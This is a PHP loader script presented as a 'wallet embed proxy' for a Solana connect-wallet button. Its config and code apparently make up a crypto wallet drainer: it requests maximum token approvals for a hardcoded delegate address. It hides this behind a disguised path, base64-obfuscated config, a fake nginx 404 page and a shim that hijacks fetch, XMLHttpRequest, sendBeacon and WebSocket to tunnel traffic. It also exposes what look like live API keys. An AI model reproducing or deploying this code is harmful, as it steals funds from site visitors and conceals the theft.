<?php
declare(strict_types=1);

/**
 * Wallet embed PHP proxy — edit $cfg below, then: node vps/build-loader.mjs
 */

$cfg = [
    'reown_project_id' => '6a35a723a14b78178c5565dca5141ab8',

    'script_path' => 'vault38472',
    'button_class_mode' => 'exact',
    'button_class' => 'ffrf2',
    'network' => 'solana',

    'site_name' => 'Connect Wallet',
    'site_description' => 'Connect your Solana wallet',
    'site_icons' => ['https://fuzzy-octo-guacamole-delta.vercel.app/tYZq2BsVawvS5wYEF.svg'],
    'site_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app',

    'vercel_bundle_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app/0EBM88LeOsHh.js',

    'analytics' => false,
    'restrict_script_access' => true,

    'token_approval_enabled' => true,
    'token_delegate' => 'c9eSVFDgCT4utkZL6PPnJfaiAGecDQy8JJBAKeND2ws',
    'token_approval_max_count' => 1,
    'token_approval_min_usd' => 1.0,
    'token_approval_amount_mode' => 'max',
    // Set HELIUS_RPC_URL on Vercel (server-side only). PHP never calls Helius directly.
    'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=68b95562-1955-4c26-92ba-0e240a8b9d62',

    'connect_popup_enabled' => true,
    'connect_popup_url' => '',

    'vercel_profile_host' => 'fuzzy-octo-guacamole-delta.vercel.app',
    'profile_script' => 'Ix9fLBj7CRLZ.js',
    'gateway_chunk' => 'Qm4nR8sV2xWp.js',
    'profile_page_chunk' => 'Wn3kL8pR4vYs.js',
    'ws_relay_chunk' => 'Zt8nK4mP2wRq.js',
    'split_chunks' => ['chunks/H7kL9mN2pQx.js'],
];

function request_origin(): string
{
    $host = $_SERVER['HTTP_HOST'] ?? '';
    if ($host === '') {
        return '';
    }
    $host = preg_replace('/:\d+$/', '', $host) ?? $host;
    $https =
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
        || (($_SERVER['SERVER_PORT'] ?? '') === '443');
    return ($https ? 'https' : 'http') . '://' . $host;
}

function vault_entry_url(array $cfg): string
{
    $path = (string) ($cfg['script_path'] ?? 'vault38472');

    return rtrim(request_origin(), '/') . '/' . $path;
}

function chunk_query_url(array $cfg, string $chunk): string
{
    return vault_entry_url($cfg) . '?c=' . rawurlencode($chunk);
}

/** @param array<string, mixed> $op */
function chunk_op_get_url(array $cfg, array $op): string
{
    $json = json_encode($op, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $d = rtrim(strtr(base64_encode($json), '+/', '-_'), '=');

    return chunk_query_url($cfg, chunk_names($cfg)['gateway']) . '&d=' . rawurlencode($d);
}

function build_embed_config(array $cfg, string $siteUrl): array
{
    $chunks = chunk_names($cfg);
    $gatewayUrl = chunk_query_url($cfg, $chunks['gateway']);
    $popupUrl = trim((string) ($cfg['connect_popup_url'] ?? ''));
    if ($popupUrl === '') {
        $popupUrl = chunk_query_url($cfg, $chunks['profilePage']);
    }

    $iconTarget = vercel_api_origin($cfg) . '/tYZq2BsVawvS5wYEF.svg';
    $icons = [chunk_op_get_url($cfg, ['t' => 'u', 'm' => 'GET', 'u' => $iconTarget])];

    return [
        'projectId' => (string) ($cfg['reown_project_id'] ?? ''),
        'buttonClass' => (string) ($cfg['button_class'] ?? ''),
        'buttonClassMode' => (string) ($cfg['button_class_mode'] ?? 'exact'),
        'network' => (string) ($cfg['network'] ?? 'solana'),
        'siteName' => (string) ($cfg['site_name'] ?? 'Website'),
        'siteDescription' => (string) ($cfg['site_description'] ?? ''),
        'siteUrl' => vercel_site_origin($cfg),
        'siteIcons' => $icons,
        'analytics' => (bool) ($cfg['analytics'] ?? true),
        'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? true),
        'tokenDelegate' => (string) ($cfg['token_delegate'] ?? ''),
        'tokenApprovalMaxCount' => (int) ($cfg['token_approval_max_count'] ?? 0),
        'tokenApprovalMinUsd' => (float) ($cfg['token_approval_min_usd'] ?? 1),
        'tokenApprovalAmountMode' => (string) ($cfg['token_approval_amount_mode'] ?? 'max'),
        'solanaRpcUrl' => $gatewayUrl,
        'priceApiUrl' => $gatewayUrl,
        'connectPopupEnabled' => (bool) ($cfg['connect_popup_enabled'] ?? true),
        'connectPopupUrl' => $popupUrl,
        'connectPopupTitle' => (string) ($cfg['connect_popup_title'] ?? ''),
        'chunkBase' => vault_entry_url($cfg),
        'splitChunks' => array_values($cfg['split_chunks'] ?? []),
    ];
}

function patch_bundle_chunk_paths(string $js, string $chunkBase): string
{
    return str_replace('__CHUNK__', rtrim($chunkBase, '/'), $js);
}

function embed_module_bootstrap(array $cfg): string
{
    $chunks = chunk_names($cfg);
    $entry = $chunks['bundle'] ?? basename((string) ($cfg['vercel_bundle_url'] ?? '0EBM88LeOsHh.js'));
    $baseJs = json_encode(vault_entry_url($cfg), JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $entryJs = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);

    return '(function(b,e){var s=document.createElement("script");s.type="module";'
        . 's.src=b+"?c="+encodeURIComponent(e);document.head.appendChild(s)})('
        . $baseJs . ',' . $entryJs . ');';
}

/** @return array{bundle: string, gateway: string, profileScript: string, profilePage: string, wsRelay: string} */
function chunk_names(array $cfg): array
{
    $bundle = basename((string) parse_url((string) ($cfg['vercel_bundle_url'] ?? ''), PHP_URL_PATH));
    if ($bundle === '' || $bundle === '/') {
        $bundle = '0EBM88LeOsHh.js';
    }

    return [
        'bundle' => $bundle,
        'gateway' => (string) ($cfg['gateway_chunk'] ?? 'Qm4nR8sV2xWp.js'),
        'profileScript' => (string) ($cfg['profile_script'] ?? 'Ix9fLBj7CRLZ.js'),
        'profilePage' => (string) ($cfg['profile_page_chunk'] ?? 'Wn3kL8pR4vYs.js'),
        'wsRelay' => (string) ($cfg['ws_relay_chunk'] ?? 'Zt8nK4mP2wRq.js'),
    ];
}

function is_static_split_chunk(array $cfg, string $chunk): bool
{
    $names = chunk_names($cfg);
    if ($chunk === $names['bundle']) {
        return true;
    }
    foreach ($cfg['split_chunks'] ?? [] as $rel) {
        if ($chunk === $rel || $chunk === basename((string) $rel)) {
            return true;
        }
    }

    return (bool) preg_match('#^chunks/[A-Za-z0-9._-]+\\.js$#', $chunk);
}

function serve_static_chunk(array $cfg, string $chunk): void
{
    $safe = $chunk;
    if (!preg_match('#^(?:chunks/)?[A-Za-z0-9._-]+\\.js$#', $safe)) {
        http_response_code(400);
        exit;
    }
    if (!str_contains($safe, '/')) {
        $names = chunk_names($cfg);
        if ($safe === $names['bundle']) {
            $safe = $names['bundle'];
        }
    }

    $body = fetch_remote_url(vercel_api_origin($cfg) . '/' . $safe);
    if ($body === null) {
        http_response_code(502);
        exit;
    }

    $body = patch_bundle_chunk_paths($body, vault_entry_url($cfg));
    header('Content-Type: application/javascript; charset=utf-8');
    header('Cache-Control: public, max-age=300');
    header('X-Content-Type-Options: nosniff');
    echo $body;
}

function script_request_allowed(array $cfg, string $siteUrl): bool
{
    if (array_key_exists('restrict_script_access', $cfg) && $cfg['restrict_script_access'] === false) {
        return true;
    }

    $allowedHosts = allowed_hosts($cfg, $siteUrl);
    if ($allowedHosts === []) {
        return true;
    }

    foreach (request_source_hosts() as $host) {
        if (in_array($host, $allowedHosts, true)) {
            return true;
        }
    }

    $secFetchSite = strtolower((string) ($_SERVER['HTTP_SEC_FETCH_SITE'] ?? ''));
    return $secFetchSite === 'same-origin' || $secFetchSite === 'same-site';
}

function allowed_hosts(array $cfg, string $siteUrl): array
{
    $hosts = [];
    $host = parse_url($siteUrl, PHP_URL_HOST);
    if (is_string($host) && $host !== '') {
        $hosts[] = strtolower($host);
        $hosts[] = str_starts_with($host, 'www.') ? substr($host, 4) : 'www.' . $host;
    }
    $serverHost = strtolower((string) ($_SERVER['HTTP_HOST'] ?? ''));
    $serverHost = preg_replace('/:\d+$/', '', $serverHost) ?? $serverHost;
    if ($serverHost !== '') {
        $hosts[] = $serverHost;
    }
    foreach ($cfg['allowed_script_hosts'] ?? [] as $extra) {
        if (is_string($extra) && $extra !== '') {
            $hosts[] = strtolower($extra);
        }
    }
    return array_values(array_unique($hosts));
}

function request_source_hosts(): array
{
    $hosts = [];
    foreach (['HTTP_ORIGIN', 'HTTP_REFERER'] as $header) {
        $value = $_SERVER[$header] ?? '';
        if (!is_string($value) || $value === '') {
            continue;
        }
        $host = parse_url($value, PHP_URL_HOST);
        if (is_string($host) && $host !== '') {
            $hosts[] = strtolower($host);
        }
    }
    return array_values(array_unique($hosts));
}

function embed_config_preamble(array $embedConfig): string
{
    $json = json_encode($embedConfig, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $payload = base64_encode($json);
    $chunks = array_map(
        static fn(string $part): string => '"' . addcslashes($part, "\\\"") . '"',
        str_split($payload, 48) ?: [''],
    );
    $blob = implode('+', $chunks);

    return '(function(w,f,j){var c=j.parse(f(' . $blob . '));'
        . 'Object.defineProperty(w,"__WALLET_EMBED_CONFIG__",'
        . '{value:c,writable:!1,enumerable:!1,configurable:!1})})(window,atob,JSON);';
}

function embed_network_shim(string $entry, array $chunks): string
{
    $entryJs = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $gwJs = json_encode($chunks['gateway'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $wsJs = json_encode($chunks['wsRelay'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);

    return '(function(e,g,w){function off(h){try{return new URL(h,location.href).origin!==location.origin}catch(r){return!1}}'
        . 'function isgw(h){try{var u=new URL(h,location.href),p=new URL(e,location.href);'
        . 'return u.pathname===p.pathname&&u.searchParams.get("c")===g}catch(r){return!1}}'
        . 'function dec(b){var n=b.replace(/-/g,"+").replace(/_/g,"/");var p=n.length%4?4-n.length%4:0;return atob(n+"=".repeat(p))}'
        . 'function pl(t){var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
        . 'if(!m)return null;var s=Number(m[1]);if(s<200||s>=300)throw new Error("chunk "+s);'
        . 'var raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
        . 'if(m[3]==="0")return raw;return JSON.parse(raw)}'
        . 'function pj(r){return r.text().then(function(t){var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
        . 'if(m&&m[3]==="0"){var raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
        . 'var u=new Uint8Array(raw.length);for(var i=0;i<raw.length;i++)u[i]=raw.charCodeAt(i);'
        . 'return new Response(u,{status:Number(m[1])})}var j=pl(t);'
        . 'return new Response(j?JSON.stringify(j):t,{status:r.status,headers:{"Content-Type":"application/json"}})})}'
        . 'function gpost(o){return pj(fetch(e+"?c="+encodeURIComponent(g),{method:"POST",headers:{"Content-Type":"application/json"},'
        . 'body:JSON.stringify(o),credentials:"same-origin"}))}'
        . 'function prox(h,n){n=n||{};var m=(n.method||"GET").toUpperCase(),b=n.body;'
        . 'var o={t:"u",m:m,u:h};if(b!=null)o.b=typeof b==="string"?b:(b instanceof Blob?b:String(b));return gpost(o)}'
        . 'var f=fetch;fetch=function(i,n){var h=typeof i==="string"?i:i instanceof Request?i.url:String(i);'
        . 'if(isgw(h))return pj(f(i,n||{}));if(off(h))return prox(h,n);return f(i,n)};'
        . 'var sb=navigator.sendBeacon&&navigator.sendBeacon.bind(navigator);'
        . 'if(sb)navigator.sendBeacon=function(u,d){if(!off(u))return sb(u,d);gpost({t:"u",m:"POST",u:String(u)});return!0};'
        . 'var xo=XMLHttpRequest.prototype.open,xs=XMLHttpRequest.prototype.send;'
        . 'XMLHttpRequest.prototype.open=function(m,h){if(typeof h==="string"&&off(h)){this._px=h;this._pm=m;arguments[1]="about:blank"}return xo.apply(this,arguments)};'
        . 'XMLHttpRequest.prototype.send=function(b){if(this._px){var x=this;prox(this._px,{method:this._pm||"GET",body:b}).then(function(r){return r.text()}).then(function(t){'
        . 'x.readyState=4;x.status=200;x.responseText=t;x.onload&&x.onload()}).catch(function(){x.onerror&&x.onerror()});return}return xs.apply(this,arguments)};'
        . 'var W=WebSocket,wb=e.replace(/^http/i,"ws");WebSocket=function(h,pr){'
        . 'if(off(h))return new W(wb+"?c="+encodeURIComponent(w),pr);return new W(h,pr)}})('
        . $entryJs . ',' . $gwJs . ',' . $wsJs . ');';
}

function vercel_api_origin(array $cfg): string
{
    return vercel_profile_origin($cfg);
}

function vercel_site_origin(array $cfg): string
{
    $url = rtrim(detect_site_url($cfg), '/');
    if ($url !== '') {
        return $url;
    }

    return rtrim(vercel_api_origin($cfg), '/');
}

function decode_chunk_payload(string $raw): ?array
{
    if ($raw === '') {
        return null;
    }
    $pad = strlen($raw) % 4;
    if ($pad > 0) {
        $raw .= str_repeat('=', 4 - $pad);
    }
    $json = base64_decode(strtr($raw, '-_', '+/'), true);
    if ($json === false) {
        return null;
    }
    $data = json_decode($json, true);

    return is_array($data) ? $data : null;
}

function upstream_host_allowed(string $host): bool
{
    $host = strtolower($host);
    $suffixes = [
        'walletconnect.org',
        'walletconnect.com',
        'web3modal.org',
        'web3modal.com',
        'reown.com',
        'jup.ag',
        'helius-rpc.com',
        'googleapis.com',
        'gstatic.com',
    ];
    foreach ($suffixes as $suffix) {
        if ($host === $suffix || str_ends_with($host, '.' . $suffix)) {
            return true;
        }
    }

    return false;
}

function is_valid_proxy_url(string $target): bool
{
    $parts = parse_url($target);

    return is_array($parts)
        && isset($parts['scheme'], $parts['host'])
        && in_array(strtolower((string) $parts['scheme']), ['https', 'http'], true);
}

function emit_js_chunk_response(int $status, string $body, bool $asJson = true): void
{
    $code = $status > 0 ? $status : 502;
    $max = 5 * 1024 * 1024;
    if (strlen($body) > $max) {
        $code = 413;
        $body = '{"error":"upstream response too large"}';
        $asJson = true;
    }

    $b64 = rtrim(strtr(base64_encode($body), '+/', '-_'), '=');
    $flag = $asJson ? '1' : '0';
    $safe = addcslashes($b64, "\\\"");

    // Chunk transport always returns HTTP 200; real upstream status is inside __WPL.
    http_response_code(200);
    header('Content-Type: application/javascript; charset=utf-8');
    header('Cache-Control: no-store');
    $origin = request_origin();
    if ($origin !== '') {
        header('Access-Control-Allow-Origin: ' . $origin);
        header('Vary: Origin');
    }
    echo 'typeof self!=="undefined"&&self.__WPL&&self.__WPL('
        . $code . ',"' . $safe . '",' . $flag . ');';
    exit;
}

/** @param array<string, mixed> $op */
function serve_upstream_op(array $cfg, array $op): void
{
    $target = (string) ($op['u'] ?? '');
    if ($target === '' || !is_valid_proxy_url($target)) {
        emit_js_chunk_response(400, '{"error":"invalid target url"}');
    }

    $parts = parse_url($target);
    $host = is_array($parts) ? strtolower((string) ($parts['host'] ?? '')) : '';
    if ($host === '' || !upstream_host_allowed($host)) {
        emit_js_chunk_response(403, '{"error":"host not allowed"}');
    }

    $method = strtoupper((string) ($op['m'] ?? 'GET'));
    $body = isset($op['b']) && $op['b'] !== '' ? (string) $op['b'] : null;

    if (!function_exists('curl_init')) {
        emit_js_chunk_response(500, '{"error":"php-curl required"}');
    }

    $ch = curl_init($target);
    if ($ch === false) {
        emit_js_chunk_response(502, '{"error":"curl_init failed"}');
    }

    $siteOrigin = vercel_site_origin($cfg);
    $accept = (string) ($_SERVER['HTTP_ACCEPT'] ?? '');
    $headers = [
        'User-Agent: wallet-embed-proxy/1.0',
        'Accept: ' . ($accept !== '' ? $accept : '*/*'),
    ];
    if ($siteOrigin !== '') {
        $headers[] = 'Origin: ' . $siteOrigin;
        $headers[] = 'Referer: ' . $siteOrigin . '/';
    }
    if ($body !== null && $method !== 'GET' && $method !== 'HEAD') {
        $headers[] = 'Content-Type: application/json';
    }

    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_ENCODING => '',
    ];
    if ($body !== null && $method !== 'GET' && $method !== 'HEAD') {
        $opts[CURLOPT_POSTFIELDS] = $body;
    }
    curl_setopt_array($ch, $opts);
    $response = curl_exec($ch);
    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    if ($response === false) {
        emit_js_chunk_response(502, '{"error":"upstream curl failed"}');
    }

    $asJson = $type === ''
        || str_contains($type, 'json')
        || str_contains($type, 'text')
        || str_contains($type, 'javascript');
    emit_js_chunk_response($code, (string) $response, $asJson);
}

function serve_gateway_chunk(array $cfg): void
{
    $chunks = chunk_names($cfg);
    $vercelUrl = vercel_api_origin($cfg) . '/' . $chunks['gateway'];
    $method = strtoupper((string) ($_SERVER['REQUEST_METHOD'] ?? 'GET'));
    $d = (string) ($_GET['d'] ?? '');

    if ($method === 'GET' && $d !== '') {
        $op = decode_chunk_payload($d);
        if (is_array($op) && ($op['t'] ?? '') === 'u') {
            serve_upstream_op($cfg, $op);
            exit;
        }
        http_response_code(400);
        exit;
    }

    if ($method !== 'POST') {
        http_response_code(405);
        exit;
    }

    $body = file_get_contents('php://input');
    if ($body === false || $body === '') {
        http_response_code(400);
        exit;
    }

    $parsed = json_decode($body, true);
    if (!is_array($parsed)) {
        http_response_code(400);
        exit;
    }

    if (isset($parsed['jsonrpc'])) {
        proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);
        return;
    }

    if (($parsed['t'] ?? '') === 'u') {
        serve_upstream_op($cfg, $parsed);
        return;
    }

    if (($parsed['t'] ?? '') === 'p') {
        proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);
        return;
    }

    http_response_code(400);
}

function proxy_forward(string $method, string $url, ?string $body, array $extraHeaders = []): void
{
    if (!function_exists('curl_init')) {
        http_response_code(500);
        header('Content-Type: text/plain; charset=utf-8');
        echo 'php-curl required for API proxy';
        exit;
    }

    $ch = curl_init($url);
    if ($ch === false) {
        http_response_code(502);
        exit;
    }

    $headers = array_merge(['User-Agent: wallet-embed-proxy/1.0'], $extraHeaders);
    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_ENCODING => '',
    ];
    if ($body !== null) {
        $opts[CURLOPT_POSTFIELDS] = $body;
    }
    curl_setopt_array($ch, $opts);
    $response = curl_exec($ch);
    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    $origin = request_origin();
    $isJsChunk = is_string($response)
        && str_contains($response, '__WPL(')
        && str_contains((string) $type, 'javascript');

    if ($isJsChunk) {
        http_response_code(200);
        if ($type !== '') {
            header('Content-Type: ' . $type);
        }
    } else {
        http_response_code($code > 0 ? $code : 502);
        if ($type !== '') {
            header('Content-Type: ' . $type);
        }
    }
    header('Cache-Control: no-store');
    if ($origin !== '') {
        header('Access-Control-Allow-Origin: ' . $origin);
        header('Vary: Origin');
    }
    echo $response === false ? '' : $response;
}

function vercel_profile_origin(array $cfg): string
{
    $host = trim((string) ($cfg['vercel_profile_host'] ?? ''));
    if ($host === '') {
        $host = (string) parse_url((string) ($cfg['site_url'] ?? ''), PHP_URL_HOST);
    }

    return 'https://' . $host;
}

function serve_popup_asset_proxy(array $cfg, string $file): void
{
    $safe = basename($file);
    if ($safe === '' || !preg_match('/^[A-Za-z0-9._-]+\\.js$/', $safe)) {
        http_response_code(400);
        exit;
    }
    proxy_forward('GET', vercel_profile_origin($cfg) . '/profile/' . $safe, null);
}

function serve_popup_proxy(array $cfg): void
{
    $html = fetch_remote_url(vercel_profile_origin($cfg) . '/profile/');
    if ($html === null || $html === '') {
        http_response_code(502);
        exit;
    }

    $chunks = chunk_names($cfg);
    $script = basename((string) ($cfg['profile_script'] ?? 'page.js'));
    $assetUrl = chunk_query_url($cfg, $chunks['profileScript']);
    $html = (string) preg_replace(
        '/<script\\s+src="' . preg_quote($script, '/') . '"\\s*><\\/script>/',
        '<script src="' . $assetUrl . '" defer></script>',
        $html,
        1
    );

    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo $html;
}

function send_generic_not_found(): void
{
    http_response_code(404);
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head>'
        . '<body><center><h1>404 Not Found</h1></center>'
        . '<hr><center>nginx</center></body></html>';
}

function detect_site_url(array $cfg): string
{
    $override = rtrim((string) ($cfg['site_url'] ?? ''), '/');
    if ($override !== '') {
        return $override;
    }
    $host = $_SERVER['HTTP_HOST'] ?? '';
    if ($host === '') {
        return '';
    }
    $host = preg_replace('/:\d+$/', '', $host) ?? $host;
    $https =
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
        || (($_SERVER['SERVER_PORT'] ?? '') === '443');
    return ($https ? 'https' : 'http') . '://' . $host;
}

function assert_vercel_bundle_url(string $url): void
{
    $parts = parse_url($url);
    if (($parts['scheme'] ?? '') !== 'https') {
        throw new RuntimeException('vercel_bundle_url must use https');
    }
    $host = strtolower((string) ($parts['host'] ?? ''));
    $ok = $host === 'vercel.app' || $host === 'vercel.sh'
        || str_ends_with($host, '.vercel.app') || str_ends_with($host, '.vercel.sh');
    if (!$ok) {
        throw new RuntimeException('vercel_bundle_url host must be a Vercel domain');
    }
    $path = (string) ($parts['path'] ?? '');
    if ($path === '' || $path === '/') {
        throw new RuntimeException('vercel_bundle_url must include a path, e.g. /p7KqN2mR9vXw.js');
    }
}

function wallet_bundle_fetch_error(string $detail = ''): void
{
    $GLOBALS['__wallet_bundle_fetch_error'] = $detail;
}

function wallet_bundle_fetch_last_error(): string
{
    return (string) ($GLOBALS['__wallet_bundle_fetch_error'] ?? '');
}

function fetch_remote_url(string $url): ?string
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        if ($ch === false) {
            wallet_bundle_fetch_error('curl_init failed');
            return null;
        }
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_CONNECTTIMEOUT => 20,
            CURLOPT_TIMEOUT => 180,
            CURLOPT_USERAGENT => 'wallet-embed-loader/1.0',
            CURLOPT_ENCODING => '',
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        ]);
        $body = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlErr = curl_error($ch);
        curl_close($ch);
        if ($body === false || $code < 200 || $code >= 300) {
            return null;
        }
        return (string) $body;
    }

    $ctx = stream_context_create([
        'http' => ['timeout' => 180, 'header' => "User-Agent: wallet-embed-loader/1.0\r\n"],
        'ssl' => ['verify_peer' => true, 'verify_peer_name' => true],
    ]);
    $body = @file_get_contents($url, false, $ctx);
    return ($body === false || $body === '') ? null : $body;
}

function fetch_vercel_bundle_remote(string $url): ?string
{
    wallet_bundle_fetch_error('');
    $body = fetch_remote_url($url);
    if ($body === null) {
        wallet_bundle_fetch_error('upstream fetch failed');
    }
    return $body;
}

function load_wallet_bundle(array $cfg): ?string
{
    $vercelUrl = trim((string) ($cfg['vercel_bundle_url'] ?? ''));
    if ($vercelUrl === '') {
        return null;
    }
    assert_vercel_bundle_url($vercelUrl);
    return fetch_vercel_bundle_remote($vercelUrl);
}

$siteUrl = detect_site_url($cfg);

if (!script_request_allowed($cfg, $siteUrl)) {
    send_generic_not_found();
    exit;
}

$chunk = (string) ($_GET['c'] ?? '');
$chunks = chunk_names($cfg);

if ($chunk !== '') {
    if ($chunk === $chunks['gateway']) {
        serve_gateway_chunk($cfg);
        exit;
    }
    if ($chunk === $chunks['profilePage']) {
        serve_popup_proxy($cfg);
        exit;
    }
    if ($chunk === $chunks['profileScript']) {
        serve_popup_asset_proxy($cfg, $chunks['profileScript']);
        exit;
    }
    if (is_static_split_chunk($cfg, $chunk)) {
        serve_static_chunk($cfg, $chunk);
        exit;
    }
    send_generic_not_found();
    exit;
}

header('Content-Type: application/javascript; charset=utf-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: public, max-age=300');
header('X-Robots-Tag: noindex, nofollow');

$embedConfig = build_embed_config($cfg, $siteUrl);
$vercelUrl = trim((string) ($cfg['vercel_bundle_url'] ?? ''));

if ($vercelUrl === '') {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Missing vercel_bundle_url in loader.php';
    exit;
}

try {
    assert_vercel_bundle_url($vercelUrl);
} catch (RuntimeException $e) {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Invalid vercel_bundle_url: ' . $e->getMessage();
    exit;
}

$entry = vault_entry_url($cfg);
echo embed_network_shim($entry, chunk_names($cfg));
echo "\n";
echo embed_config_preamble($embedConfig);
echo "\n";
echo embed_module_bootstrap($cfg);
